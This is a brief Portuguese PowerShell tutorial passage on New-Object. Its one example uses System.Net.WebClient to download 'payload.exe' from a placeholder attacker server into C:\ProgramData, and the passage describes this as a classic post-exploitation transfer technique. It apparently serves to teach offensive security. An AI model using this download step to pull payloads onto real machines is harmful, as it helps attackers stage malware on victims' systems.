## Criando Objetos .NET

### O cmdlet New-Object

Com `New-Object`, podemos instanciar classes do .NET Framework ou objetos COM
diretamente no PowerShell, expandindo enormemente nossas capacidades.

### Exemplo: download de arquivo via WebClient

```powershell
# Criar uma instância do WebClient
$webclient = New-Object System.Net.WebClient

# Definir a URL de origem e o destino local
$url = "https://servidor_atacante/payload.exe"
$destino = "C:\ProgramData\payload.exe"

# Realizar o download
$webclient.DownloadFile($url, $destino)
```

**Explicação linha a linha:**

1. `New-Object System.Net.WebClient` — cria um cliente HTTP usando a classe .NET
2. `$url` — armazena o endereço do arquivo remoto
3. `$destino` — define onde o arquivo será salvo localmente
4. `.DownloadFile()` — método do WebClient que efetua o download

> Este é um dos métodos mais clássicos de transferência de arquivos em cenários
> de pós-exploração.

---
